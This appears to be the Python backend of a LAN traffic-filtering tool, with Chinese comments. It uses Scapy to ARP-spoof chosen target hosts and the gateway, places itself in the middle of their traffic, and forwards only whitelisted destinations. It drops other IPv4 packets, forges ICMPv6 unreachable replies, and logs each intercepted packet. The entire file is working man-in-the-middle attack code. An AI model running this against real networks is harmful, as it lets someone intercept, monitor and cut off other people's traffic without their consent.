import sys
import json
import socket
import threading
from urllib.parse import urlparse
from scapy.all import ARP, Ether, IP, TCP, UDP, sendp, sniff, get_if_hwaddr, srp, conf
from scapy.layers.inet6 import IPv6, ICMPv6DestUnreach

# --- 通讯函式 ---
def log(level, message):
    """向前端发送日志讯息"""
    print(json.dumps({"type": "log", "level": level, "message": message}), flush=True)

def event(event_type, data):
    """向前端发送事件"""
    print(json.dumps({"type": event_type, "data": data}), flush=True)

# --- 网路核心函式 ---
def get_mac_address(ip_address, interface):
    """根据 IP 位址获取 MAC 位址"""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, iface=interface, verbose=False)
        return ans[0][1].hwsrc if ans else None
    except Exception as e:
        log('debug', f"get_mac_address for {ip_address} failed: {e}")
        return None

stop_event_flag = threading.Event()

def arp_spoof(gateway_ip, gateway_mac, target_macs, attacker_mac, interface):
    """持续进行 ARP 欺骗的背景执行绪"""
    while not stop_event_flag.is_set():
        try:
            for target_ip, target_mac in target_macs.items():
                if target_mac:
                    sendp(
                        Ether(dst=target_mac)
                        / ARP(
                            op=2,
                            psrc=gateway_ip,
                            pdst=target_ip,
                            hwsrc=attacker_mac,
                            hwdst=target_mac,
                        ),
                        iface=interface,
                        verbose=False,
                    )
                    sendp(
                        Ether(dst=gateway_mac)
                        / ARP(
                            op=2,
                            psrc=target_ip,
                            pdst=gateway_ip,
                            hwsrc=attacker_mac,
                            hwdst=gateway_mac,
                        ),
                        iface=interface,
                        verbose=False,
                    )
            stop_event_flag.wait(2)
        except Exception as e:
            log('error', f'Spoofing loop error: {e}')

def restore_arp(gateway_ip, gateway_mac, target_macs, interface):
    """恢复网路 ARP 表"""
    log('info', 'Restoring network for all targets...')
    for target_ip, target_mac in target_macs.items():
        if target_mac and gateway_mac:
            sendp(
                Ether(dst=target_mac)
                / ARP(
                    op=2,
                    psrc=gateway_ip,
                    pdst=target_ip,
                    hwsrc=gateway_mac,
                    hwdst=target_mac,
                ),
                iface=interface,
                count=5,
                verbose=False,
            )
            sendp(
                Ether(dst=gateway_mac)
                / ARP(
                    op=2,
                    psrc=target_ip,
                    pdst=gateway_ip,
                    hwsrc=target_mac,
                    hwdst=gateway_mac,
                ),
                iface=interface,
                count=5,
                verbose=False,
            )
    log('info', 'Network restored.')

def normalize_mac(mac_address):
    return mac_address.lower() if mac_address else None


def strip_scope_id(address):
    return address.split('%', 1)[0]


def resolve_whitelist_entries(whitelist_urls):
    ipv4_set = set()
    ipv6_set = set()

    for url_str in whitelist_urls:
        if not url_str:
            continue

        parsed = urlparse(url_str if '://' in url_str else f'http://{url_str}')
        hostname = parsed.hostname or url_str

        try:
            addrinfo_list = socket.getaddrinfo(hostname, None, proto=socket.IPPROTO_TCP)
        except socket.gaierror as exc:
            log('warning', f"Cannot resolve URL: {url_str} ({exc})")
            continue

        has_address = False
        for family, _socktype, _proto, _canonname, sockaddr in addrinfo_list:
            if family == socket.AF_INET:
                ipv4_set.add(sockaddr[0])
                has_address = True
            elif family == socket.AF_INET6:
                ipv6_set.add(strip_scope_id(sockaddr[0]))
                has_address = True

        if has_address:
            log('info', f"Whitelist: {hostname} -> {sorted({*ipv4_set, *ipv6_set})}")
        else:
            log('warning', f"No IP addresses resolved for {url_str}")

    return ipv4_set, ipv6_set


def forward_frame(packet, iface, src_mac, dst_mac):
    frame = packet.copy()
    frame[Ether].src = src_mac
    frame[Ether].dst = dst_mac

    if frame.haslayer(IP):
        del frame[IP].chksum
    if frame.haslayer(IPv6):
        frame[IPv6].plen = None
    if frame.haslayer(TCP):
        del frame[TCP].chksum
    if frame.haslayer(UDP):
        del frame[UDP].chksum

    sendp(frame, iface=iface, verbose=False)

# --- 主程式逻辑 ---
def main():
    stop_event_flag.clear()
    spoof_thread = None
    INTERFACE = GATEWAY_IP = ATTACKER_IP = None
    ATTACKER_MAC = GATEWAY_MAC = None
    target_macs = {}
    error = None

    try:
        config = json.loads(sys.argv[1])
        target_ips = config.get("target_ips", [])
        whitelist_urls = config.get("whitelist", [])

        if not target_ips:
            log('critical', "No target IPs provided. Exiting.")
            return

        route_info = conf.route
        if not route_info or not hasattr(route_info, 'route') or not route_info.route("0.0.0.0"):
            log('critical', "Could not determine default route.")
            return

        INTERFACE, ATTACKER_IP, GATEWAY_IP = route_info.route("0.0.0.0", verbose=False)

        if not INTERFACE or INTERFACE.startswith('lo'):
            log('critical', f"No valid network interface found. Detected: {INTERFACE}. Please check network connection.")
            return

        log('info', f"Network detected: IFACE={INTERFACE}, Gateway={GATEWAY_IP}")

        whitelist_ipv4, whitelist_ipv6 = resolve_whitelist_entries(whitelist_urls)
        whitelist_ipv4.update({GATEWAY_IP, "8.8.8.8", "8.8.4.4"})

        ATTACKER_MAC = normalize_mac(get_if_hwaddr(INTERFACE))
        GATEWAY_MAC = normalize_mac(get_mac_address(GATEWAY_IP, INTERFACE))

        mac_to_ip = {}
        for ip in target_ips:
            mac = normalize_mac(get_mac_address(ip, INTERFACE))
            if mac:
                target_macs[ip] = mac
                mac_to_ip[mac] = ip
                event('mac_found', {"ip": ip, "mac": mac})
            else:
                log('error', f"Failed to get MAC for target: {ip}")

        target_macs = {ip: mac for ip, mac in target_macs.items() if mac}

        if not ATTACKER_MAC or not GATEWAY_MAC or not target_macs:
            log('critical', "Missing essential MACs or could not find any target. Exiting.")
            return

        monitored_macs = set(target_macs.values())
        ipv6_local_map = {}

        bpf_filter = f"ether dst {ATTACKER_MAC}"
        log('debug', f"Using BPF filter: {bpf_filter}")

        spoof_thread = threading.Thread(
            target=arp_spoof,
            args=(GATEWAY_IP, GATEWAY_MAC, target_macs, ATTACKER_MAC, INTERFACE),
            daemon=True,
        )
        spoof_thread.start()
        log('info', 'ARP spoofing thread started.')

        def block_ipv6_packet(packet, target_mac):
            try:
                offending = bytes(packet[IPv6])[:1232]
                response = (
                    Ether(src=ATTACKER_MAC, dst=target_mac)
                    / IPv6(src=packet[IPv6].dst, dst=packet[IPv6].src)
                    / ICMPv6DestUnreach(code=1)
                    / offending
                )
                sendp(response, iface=INTERFACE, verbose=False)
                log('info', f"Blocked IPv6 traffic from {packet[IPv6].src} to {packet[IPv6].dst}")
            except Exception as err:
                log('debug', f"Failed to send IPv6 block packet: {err}")

        def packet_processor(packet):
            if not packet.haslayer(Ether):
                return

            src_mac = normalize_mac(packet[Ether].src)
            if src_mac == ATTACKER_MAC:
                return

            if packet.haslayer(IP):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst

                if src_ip in target_macs:
                    allowed = dst_ip in whitelist_ipv4
                    status = "allowed" if allowed else "blocked"
                    meta = {"status": status, "src": src_ip, "dst": dst_ip, "protocol": "ipv4"}
                    if packet.haslayer(TCP):
                        meta["dport"] = packet[TCP].dport
                    elif packet.haslayer(UDP):
                        meta["dport"] = packet[UDP].dport
                    event('packet', meta)

                    if allowed:
                        forward_frame(packet, INTERFACE, ATTACKER_MAC, GATEWAY_MAC)
                    # 非白名單流量留在本機，維持阻擋
                elif dst_ip in target_macs:
                    target_mac = target_macs[dst_ip]
                    forward_frame(packet, INTERFACE, ATTACKER_MAC, target_mac)

            elif packet.haslayer(IPv6):
                src_ipv6 = strip_scope_id(packet[IPv6].src)
                dst_ipv6 = strip_scope_id(packet[IPv6].dst)

                if src_mac in monitored_macs:
                    ipv6_local_map[src_ipv6] = src_mac
                    allowed = dst_ipv6 in whitelist_ipv6
                    status = "allowed" if allowed else "blocked"
                    event('packet', {
                        "status": status,
                        "src": mac_to_ip.get(src_mac, src_ipv6),
                        "dst": dst_ipv6,
                        "protocol": "ipv6",
                    })

                    if allowed:
                        forward_frame(packet, INTERFACE, ATTACKER_MAC, GATEWAY_MAC)
                    else:
                        block_ipv6_packet(packet, src_mac)
                elif src_mac == GATEWAY_MAC:
                    target_mac = ipv6_local_map.get(dst_ipv6)
                    if target_mac:
                        forward_frame(packet, INTERFACE, ATTACKER_MAC, target_mac)

        try:
            sniff(
                prn=packet_processor,
                iface=INTERFACE,
                store=False,
                filter=bpf_filter,
                stop_filter=lambda _: stop_event_flag.is_set(),
            )
        except KeyboardInterrupt:
            log('info', 'Received interrupt signal, stopping monitoring.')
        except Exception as sniff_error:
            log('critical', f'Packet processing failed: {sniff_error}')
            error = sniff_error

    except Exception as exc:
        log('critical', f'A critical error occurred in backend: {exc}')
        error = exc
    finally:
        stop_event_flag.set()
        if spoof_thread and spoof_thread.is_alive():
            spoof_thread.join(timeout=3)
        if INTERFACE and GATEWAY_IP and GATEWAY_MAC and target_macs:
            restore_arp(GATEWAY_IP, GATEWAY_MAC, target_macs, INTERFACE)

    if error:
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_event_flag.set()
